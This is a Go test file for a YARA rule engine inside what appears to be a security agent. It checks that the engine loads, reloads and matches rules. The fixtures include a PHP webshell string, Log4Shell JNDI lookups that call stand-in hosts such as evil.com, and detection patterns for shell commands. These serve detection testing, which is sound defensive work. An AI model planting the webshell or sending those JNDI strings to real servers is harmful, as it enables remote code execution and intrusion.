package content_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/aiss/agent/internal/security/content"
)

// writeYARFile writes a .yar rules file to a temp directory and returns the dir.
func writeYARFile(t *testing.T, name, data string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, name+".yar")
	if err := os.WriteFile(path, []byte(data), 0644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// ── Engine loading ────────────────────────────────────────────────────────

func TestYARA_NewEngine_EmptyDir(t *testing.T) {
	dir := t.TempDir()
	engine, err := content.NewYARAEngine(dir)
	if err != nil {
		t.Fatalf("empty dir should not error: %v", err)
	}
	if engine.RuleCount() != 0 {
		t.Errorf("expected 0 rules in empty dir, got %d", engine.RuleCount())
	}
}

func TestYARA_NewEngine_InvalidDir(t *testing.T) {
	_, err := content.NewYARAEngine("/nonexistent/path/that/does/not/exist")
	// Should not error — filepath.Glob returns no files for missing dir
	// but may error depending on OS. Either is acceptable.
	_ = err
}

func TestYARA_RuleCount_LoadedCorrectly(t *testing.T) {
	rules := `
rule TestRuleA {
    meta:
        description = "Test rule A"
        severity = "HIGH"
    strings:
        $a = "malware_payload_a"
    condition:
        any of them
}

rule TestRuleB {
    meta:
        description = "Test rule B"
        severity = "CRITICAL"
    strings:
        $b = "malware_payload_b"
    condition:
        any of them
}
`
	dir := writeYARFile(t, "test", rules)
	engine, err := content.NewYARAEngine(dir)
	if err != nil {
		t.Fatalf("NewYARAEngine failed: %v", err)
	}
	if engine.RuleCount() != 2 {
		t.Errorf("expected 2 rules, got %d", engine.RuleCount())
	}
}

// ── Scan: basic string matching ───────────────────────────────────────────

func TestYARA_Scan_PlainStringMatch(t *testing.T) {
	rules := `
rule WebShell_PHP {
    meta:
        description = "PHP webshell detection"
        severity = "CRITICAL"
    strings:
        $s1 = "system($_GET"
    condition:
        any of them
}
`
	dir := writeYARFile(t, "webshells", rules)
	engine, err := content.NewYARAEngine(dir)
	if err != nil {
		t.Fatalf("NewYARAEngine failed: %v", err)
	}

	result := engine.Scan([]byte(`<?php system($_GET['cmd']); ?>`))
	if !result.Matched {
		t.Error("PHP webshell payload should match WebShell_PHP rule")
	}
	if result.RuleName != "WebShell_PHP" {
		t.Errorf("expected RuleName=WebShell_PHP, got %q", result.RuleName)
	}
}

func TestYARA_Scan_RegexMatch(t *testing.T) {
	rules := `
rule Log4Shell {
    meta:
        description = "Log4Shell JNDI injection"
        severity = "CRITICAL"
    strings:
        $jndi = /\$\{jndi:(ldap|rmi|dns):\/\//
    condition:
        any of them
}
`
	dir := writeYARFile(t, "exploits", rules)
	engine, err := content.NewYARAEngine(dir)
	if err != nil {
		t.Fatalf("NewYARAEngine failed: %v", err)
	}

	cases := []string{
		"${jndi:ldap://evil.com/x}",
		"${jndi:rmi://192.168.1.1:1099/obj}",
		"${jndi:dns://attacker.com}",
	}
	for _, c := range cases {
		result := engine.Scan([]byte(c))
		if !result.Matched {
			t.Errorf("Log4Shell payload not detected: %q", c)
		}
	}
}

func TestYARA_Scan_NoMatch_CleanContent(t *testing.T) {
	rules := `
rule Suspicious_Shellcode {
    meta:
        description = "Generic shellcode"
        severity = "HIGH"
    strings:
        $s1 = "exec(/bin/sh"
        $s2 = "/bin/bash -c"
    condition:
        any of them
}
`
	dir := writeYARFile(t, "exploits", rules)
	engine, err := content.NewYARAEngine(dir)
	if err != nil {
		t.Fatalf("NewYARAEngine failed: %v", err)
	}

	cleanInputs := []string{
		"Hello World",
		"GET /api/users HTTP/1.1",
		`{"username":"alice","role":"user"}`,
		"/static/app.js",
		"Mozilla/5.0 Chrome/120",
	}
	for _, input := range cleanInputs {
		result := engine.Scan([]byte(input))
		if result.Matched {
			t.Errorf("clean input falsely matched rule %q: %q", result.RuleName, input)
		}
	}
}

func TestYARA_Scan_EmptyData(t *testing.T) {
	rules := `
rule Any {
    strings:
        $s = "anything"
    condition:
        any of them
}
`
	dir := writeYARFile(t, "test", rules)
	engine, _ := content.NewYARAEngine(dir)
	result := engine.Scan([]byte{})
	if result.Matched {
		t.Error("empty data should never match")
	}
}

// ── Meta field extraction ─────────────────────────────────────────────────

func TestYARA_Scan_SeverityPropagated(t *testing.T) {
	rules := `
rule TestCritical {
    meta:
        description = "Critical test rule"
        severity = "CRITICAL"
    strings:
        $s = "critical_payload_xyz"
    condition:
        any of them
}
`
	dir := writeYARFile(t, "test", rules)
	engine, _ := content.NewYARAEngine(dir)
	result := engine.Scan([]byte("critical_payload_xyz"))
	if !result.Matched {
		t.Fatal("should match")
	}
	if result.Severity != "CRITICAL" {
		t.Errorf("expected severity CRITICAL, got %q", result.Severity)
	}
	if result.Description != "Critical test rule" {
		t.Errorf("expected description 'Critical test rule', got %q", result.Description)
	}
}

func TestYARA_Scan_NamespacePropagated(t *testing.T) {
	rules := `
rule TestNS {
    strings:
        $s = "unique_ns_test_value"
    condition:
        any of them
}
`
	dir := writeYARFile(t, "webshells", rules)
	engine, _ := content.NewYARAEngine(dir)
	result := engine.Scan([]byte("unique_ns_test_value"))
	if !result.Matched {
		t.Fatal("should match")
	}
	if result.Namespace != "webshells" {
		t.Errorf("expected namespace 'webshells', got %q", result.Namespace)
	}
}

// ── Hot-reload ────────────────────────────────────────────────────────────

func TestYARA_Load_HotReload(t *testing.T) {
	initial := `
rule InitialRule {
    strings:
        $s = "initial_payload"
    condition:
        any of them
}
`
	updated := `
rule UpdatedRule {
    strings:
        $s = "updated_payload"
    condition:
        any of them
}
`
	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "test.yar")

	// Write initial rules
	if err := os.WriteFile(rulesPath, []byte(initial), 0644); err != nil {
		t.Fatal(err)
	}
	engine, err := content.NewYARAEngine(dir)
	if err != nil {
		t.Fatal(err)
	}

	// Should match initial
	if !engine.Scan([]byte("initial_payload")).Matched {
		t.Error("should match initial rule before reload")
	}

	// Update rules file
	if err := os.WriteFile(rulesPath, []byte(updated), 0644); err != nil {
		t.Fatal(err)
	}

	// Hot-reload
	if err := engine.Load(dir); err != nil {
		t.Fatalf("hot-reload failed: %v", err)
	}

	// Should now match updated
	if !engine.Scan([]byte("updated_payload")).Matched {
		t.Error("should match updated rule after reload")
	}
	// Should no longer match initial
	if engine.Scan([]byte("initial_payload")).Matched {
		t.Error("should NOT match initial rule after reload replaced it")
	}
}

// ── Multiple rule files ───────────────────────────────────────────────────

func TestYARA_MultipleFiles_AllLoaded(t *testing.T) {
	dir := t.TempDir()
	files := map[string]string{
		"webshells.yar": `rule WebShell { strings: $s = "php_shell_marker" condition: any of them }`,
		"exploits.yar":  `rule Exploit { strings: $s = "jndi_exploit_marker" condition: any of them }`,
		"dlp.yar":       `rule DLP { strings: $s = "credit_card_marker" condition: any of them }`,
	}
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
	}

	engine, err := content.NewYARAEngine(dir)
	if err != nil {
		t.Fatalf("multi-file load failed: %v", err)
	}
	if engine.RuleCount() != 3 {
		t.Errorf("expected 3 rules from 3 files, got %d", engine.RuleCount())
	}

	// Each marker should be detected
	markers := []string{"php_shell_marker", "jndi_exploit_marker", "credit_card_marker"}
	for _, m := range markers {
		result := engine.Scan([]byte(m))
		if !result.Matched {
			t.Errorf("marker %q not detected", m)
		}
	}
}

// ── Actual rules files (integration with project YARA files) ──────────────

func TestYARA_ProjectRules_WebshellDetection(t *testing.T) {
	// Try to load the actual project rules if they exist
	rulesDir := "../../../../rules/yara"
	if _, err := os.Stat(rulesDir); os.IsNotExist(err) {
		t.Skip("project YARA rules not found — skipping integration test")
	}

	engine, err := content.NewYARAEngine(rulesDir)
	if err != nil {
		t.Fatalf("failed to load project YARA rules: %v", err)
	}

	t.Logf("Loaded %d project YARA rules", engine.RuleCount())

	// PHP webshell
	phpShell := []byte("<?php system($_GET['cmd']); eval(base64_decode($payload)); ?>")
	result := engine.Scan(phpShell)
	if !result.Matched {
		t.Logf("PHP webshell not matched (rule coverage may vary): check webshells.yar")
	} else {
		t.Logf("PHP webshell detected by rule: %s", result.RuleName)
	}
}

// ── Benchmarks ────────────────────────────────────────────────────────────

func BenchmarkYARAScan_NoMatch(b *testing.B) {
	rules := `
rule BenchRule {
    strings:
        $s1 = "very_specific_benchmark_payload_zyxwvutsrqp"
    condition:
        any of them
}
`
	dir := writeYARFile(&testing.T{}, "bench", rules)
	engine, _ := content.NewYARAEngine(dir)
	data := []byte("GET /api/products HTTP/1.1\r\nHost: example.com\r\n\r\n")
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		engine.Scan(data)
	}
}

func BenchmarkYARAScan_Match(b *testing.B) {
	rules := `
rule BenchRuleMatch {
    strings:
        $s = "jndi:ldap"
    condition:
        any of them
}
`
	dir := writeYARFile(&testing.T{}, "bench", rules)
	engine, _ := content.NewYARAEngine(dir)
	data := []byte(`${jndi:ldap://evil.com/exploit}`)
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		engine.Scan(data)
	}
}
